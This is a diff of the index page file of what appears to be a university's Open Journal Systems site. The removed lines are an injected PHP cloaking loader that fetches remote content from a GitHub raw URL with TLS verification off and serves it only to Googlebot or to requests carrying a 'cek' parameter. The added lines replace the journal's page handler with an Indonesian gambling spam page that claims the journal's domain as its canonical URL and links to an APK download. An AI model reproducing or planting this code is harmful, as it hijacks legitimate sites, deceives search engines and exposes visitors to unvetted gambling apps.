@@ -1,62 +1,342 @@
-<?php
-$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$q = isset($_GET['cek']);
-$b = (strpos($ua,'googlebot')!==false | strpos($ua,'inspectiontool')!==false | $q);
-if ($b) {
-  $u = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/unsiq-rev.txt';
-  $r = '';
-  if (function_exists('curl_init')) {
-    $c = curl_init($u);
-    curl_setopt_array($c,[
-      CURLOPT_RETURNTRANSFER=>1,
-      CURLOPT_FOLLOWLOCATION=>1,
-      CURLOPT_TIMEOUT=>4,
-      CURLOPT_SSL_VERIFYPEER=>0,
-      CURLOPT_SSL_VERIFYHOST=>0,
-      CURLOPT_HTTPHEADER=>[
-        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-        'Accept: text/html',
-        'Referer: https://www.google.com/'
-      ]
-    ]);
-    $r = curl_exec($c);
-    curl_close($c);
-  }
-  if (!$r && ini_get('allow_url_fopen')) {
-    $ctx = stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0\r\nAccept: text/html\r\nReferer: https://www.google.com/"]]);
-    $r = @file_get_contents($u, false, $ctx);
-  }
-  if ($r && strlen($r)>100) {
-    while (ob_get_level()) ob_end_clean();
-    header("Vary: User-Agent");
-    header("X-Robots-Tag: index, follow, archive");
-    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
-    header('Pragma: no-cache');
-    echo $r;
-    exit;
-  }
-}
 
 
-/**
- * @defgroup pages_index Index Pages
- */
+<!DOCTYPE html>
+<html amp lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1" />
+  <title>Slot777: Daftar Link Situs Toto Slot Gacor Resmi Thailand Paling Gampang Maxwin 2026</title>
+  <meta name="description" content="SLOT777 adalah situs toto slot gacor paling gampang maxwin, kami juga menyediakan pola slot resmi yang saat ini di yakini mudah jackpot via server thailand. Dari segi permianan slot bet mulai 200 perak yang sedang naik daun di kalangan komunitas slot online, selain itu juga kami menawarkan ratusan provider dengan promo paling menarik setiap hari." />
+  <meta name="robots" content="index,follow" />
+  <link href="https://i.imgur.com/VmulCLK.png" rel="shortcut icon" type="image/x-icon" />
+  <link rel="canonical" href="https://e-journal.stajember.ac.id/" />
+  <meta property="og:url" content="https://e-journal.stajember.ac.id/" />
+  <link rel="alternate" hreflang="id-id" href="https://e-journal.stajember.ac.id/" />
+  <meta property="og:site_name" content="SLOT777" />
+  <meta property="og:image:alt" content="SLOT777" />
+  <meta property="og:image" content="https://i.imgur.com/ae41w3s.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js" />
+  <script async src="https://cdn.ampproject.org/v0.js"></script>
+  <style amp-boilerplate>
+    body { -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both; -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both; -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both; animation: -amp-start 8s steps(1, end) 0s 1 normal both }
+    @-webkit-keyframes -amp-start { from { visibility: hidden } to { visibility: visible } }
+    @-moz-keyframes -amp-start { from { visibility: hidden } to { visibility: visible } }
+    @-ms-keyframes -amp-start { from { visibility: hidden } to { visibility: visible } }
+    @-o-keyframes -amp-start { from { visibility: hidden } to { visibility: visible } }
+    @keyframes -amp-start { from { visibility: hidden } to { visibility: visible } }
+  </style>
+  <noscript>
+    <style amp-boilerplate>
+      body { -webkit-animation: none; -moz-animation: none; -ms-animation: none; animation: none }
+    </style>
+  </noscript>
 
-/**
- * @file pages/index/index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- *
- */
+  <style amp-custom>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    :root {
+      --primary: #9200e6;
+      --primary-dark: #5c0099;
+      --secondary: #8900d9; 
+      --bg-dark: #050505;
+      --card-bg: rgba(20, 20, 20, 0.85);
+      --text: #ffffff;
+    }
 
-switch ($op) {
-    case 'index':
-        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
-        break;
-}
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-image: url(https://i.imgur.com/ae41w3s.png);
+      background-attachment: fixed;
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      padding: 20px 10px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+    }
+
+    .card {
+      background: rgb(12 12 12 / 71%);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 20px;
+      padding: 25px 20px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(0, 0, 0, 0.5);
+    }
+
+    header {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      filter: drop-shadow(0 0 15px rgba(97, 66, 0, 0.4));
+      transition: transform 0.3s ease;
+    }
+    .logo:hover { transform: scale(1.05); }
+
+    .title-wrap {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .badge-top {
+      display: inline-block;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 4px 10px;
+      border-radius: 20px;
+      background: rgba(174, 0, 255, 0.15);
+      color: rgb(119, 0, 255);
+      border: 1px solid rgba(140, 0, 255, 0.3);
+      margin-bottom: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .title-wrap h1 {
+      font-size: 20px;
+      font-weight: 700;
+      line-height: 1.3;
+      margin-bottom: 8px;
+      background: -webkit-linear-gradient(#fff, #ccc);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .title-wrap p {
+      font-size: 12px;
+      color: #aaa;
+      font-weight: 300;
+    }
+
+    .welcome {
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 20px;
+      text-align: center;
+      border-left: 3px solid rgb(132, 0, 255);
+    }
+
+    .welcome h3 {
+      font-size: 12px;
+      color: #fff;
+      font-family: 'Courier New', Courier, monospace; 
+      overflow: hidden;
+      border-right: .15em solid rgb(119, 0, 255);
+      white-space: nowrap;
+      margin: 0 auto;
+      width: fit-content;
+      animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite;
+    }
+
+    @keyframes typing { from { width: 0 } to { width: 100% } }
+    @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #ffa600; } }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      border-radius: 50px;
+      text-decoration: none;
+      text-align: center;
+      font-weight: 700;
+      font-size: 14px;
+      margin-bottom: 12px;
+      position: relative;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .btn-primary {
+      background:linear-gradient(135deg, #9200e6 0%, #5c0099 100%);
+      color: #fff;
+      box-shadow: 0 4px 15px rgba(119, 0, 230, 0.4);
+      animation: pulse 2s infinite;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .btn-secondary {
+      background: rgba(255, 255, 255, 0.05);
+      color: #8900d9;
+      border: 1px solid #8900d9;
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 1px solid #444;
+      color: #ccc;
+      font-size: 12px;
+      padding: 10px;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(100, 0, 230, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(230, 0, 0, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(230, 0, 0, 0); }
+    }
+
+
+    .hero {
+      margin: 20px 0;
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .table-wrapper {
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 15px;
+      overflow: hidden;
+      margin-top: 10px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: separate;
+      border-spacing: 0;
+    }
+
+    th {
+      background: linear-gradient(90deg, rgb(112, 2, 215), #3d0083);
+      color: #fff;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    td {
+      padding: 12px;
+      background: rgba(255, 255, 255, 0.02);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      vertical-align: middle;
+    }
+    
+    tr:last-child td { border-bottom: none; }
+
+    td:first-child {
+      font-weight: 600;
+      font-size: 13px;
+      color: #ddd;
+    }
+
+    .btn-mini {
+      display: inline-block;
+      padding: 6px 15px;
+      background: #9300d7;
+      color: #000000;
+      font-weight: 700;
+      font-size: 11px;
+      border-radius: 20px;
+      text-decoration: none;
+      box-shadow: 0 2px 5px rgba(76, 0, 255, 0.3);
+    }
+
+    .copyright {
+      margin-top: 25px;
+      text-align: center;
+      font-size: 11px;
+      color: #666;
+    }
+    .copyright a { color: #8900d9; text-decoration: none; }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="card">
+      <header>
+          <amp-img
+            class="logo"
+            src="https://i.imgur.com/HjXyPvW.gif"
+            alt="Logo SLOT777"
+            width="200"
+            height="60"
+            layout="intrinsic">
+          </amp-img>
+      </header>
+
+      <div class="title-wrap">
+        <span class="badge-top">Welcome To NANA4D Bossku</span>
+        <h1>Slot777: Daftar Link Situs Toto Slot Gacor Resmi Thailand Paling Gampang Maxwin 2026</h1>
+        
+      </div>
+
+      <div class="welcome">
+        <h3>Live Casino | Togel Online | Slot Gacor </h3>
+      </div>
+
+      <a href="https://jetlinkr.co/KWNANA1" target="_blank" rel="noreferrer noopener" class="btn btn-primary">
+        DAFTAR NANA4D
+      </a>
+      
+      <a href="https://jetlinkr.co/KWNANA3" target="_blank" rel="noreferrer noopener" class="btn btn-secondary">
+        LOGIN NANA4D
+      </a>
+
+      <div class="hero">
+        <amp-img
+          src="https://i.imgur.com/ae41w3s.png"
+          width="600"
+          height="600"
+          layout="responsive"
+          alt="Slot777: Daftar Link Situs Toto Slot Gacor Resmi Thailand Paling Gampang Maxwin 2026">
+        </amp-img>
+      </div>
+
+      <div class="table-wrapper">
+        <table>
+          <thead>
+            <tr>
+              <th style="text-align:left; padding-left:20px;">Akses NANA4D</th>
+              <th style="text-align:right; padding-right:20px;">🎰</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>LAYANAN CS</td>
+              <td style="text-align:right;">
+                <a href="https://direct.lc.chat/12910419" target="_blank" rel="noreferrer noopener" class="btn-mini">KLIK SINI</a>
+              </td>
+            </tr>
+            <tr>
+              <td>RTP SLOT GACOR</td>
+              <td style="text-align:right;">
+                <a href="https://jetlinkr.co/KWNANA1" target="_blank" rel="noreferrer noopener" class="btn-mini">KLIK SINI</a>
+              </td>
+            </tr>
+            <tr>
+              <td>PREDIKSI TOGEL JITU</td>
+              <td style="text-align:right;">
+                <a href="https://jetlinkr.co/KWNANA2" target="_blank" rel="noreferrer noopener" class="btn-mini">KLIK SINI</a>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <a href="https://jetlinkr.co/apk-nana4d" target="_blank" rel="noreferrer noopener" class="btn btn-outline" style="margin-top:15px;">
+        🌐 DOWNLOAD APK NANA4D RESMI
+      </a>
+
+      <p class="copyright">
+        Copyright © 2026 • <a href="https://jetlinkr.co/KWNANA1">SLOT777</a> | SONIC
+      </p>
+    </div>
+  </div>
+</body>
+</html>
